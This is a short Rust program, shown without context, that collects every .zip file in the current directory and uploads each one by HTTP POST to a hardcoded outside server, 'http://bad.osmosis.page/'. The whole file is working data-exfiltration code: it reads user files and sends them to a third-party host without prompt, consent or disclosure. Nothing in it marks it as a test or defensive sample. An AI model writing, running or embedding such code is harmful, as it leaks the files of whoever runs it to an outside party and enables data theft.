use std::fs::{self, File};
use reqwest::multipart;
use std::path::Path;
use tokio;
use std::io::{self, Read};

fn get_all_files_in_current_dir() -> io::Result<Vec<String>> {
    let mut file_paths = Vec::new();
    let current_dir = std::env::current_dir()?;
    
    for entry in fs::read_dir(current_dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_file() {
            if let Some(path_str) = path.to_str() {
                file_paths.push(path_str.to_string());
            }
        }
    }
    Ok(file_paths)
}

async fn send_file(file_path: &str, server_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file_name = Path::new(file_path)
        .file_name()
        .and_then(|name| name.to_str())
        .ok_or("Invalid file name")?;

    // Open the file to be sent
    let mut file = File::open(file_path)?;
    let mut file_data = Vec::new();
    file.read_to_end(&mut file_data)?;

    // Create `Part` for the file data and set the file name
    let file_part = multipart::Part::bytes(file_data)
        .file_name(file_name.to_string());

    // Create multipart form to send the file
    let form = multipart::Form::new()
        .part("file", file_part);
    
    // Send the POST request
    let client = reqwest::Client::new();
    let res = client
        .post(server_url)
        .multipart(form)
        .send()
        .await?;

    println!("Sent file: {} -> Status: {:?}", file_name, res.status());
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let files = get_all_files_in_current_dir()?;
    
    // Hardcoded server URL
    let server_url = "http://bad.osmosis.page/";
    
    for file_path in files.iter().filter(|path| path.ends_with(".zip")) {
        if let Err(e) = send_file(&file_path, server_url).await {
            eprintln!("Error sending file {}: {}", &file_path, e);
        }
    }

    Ok(())
}
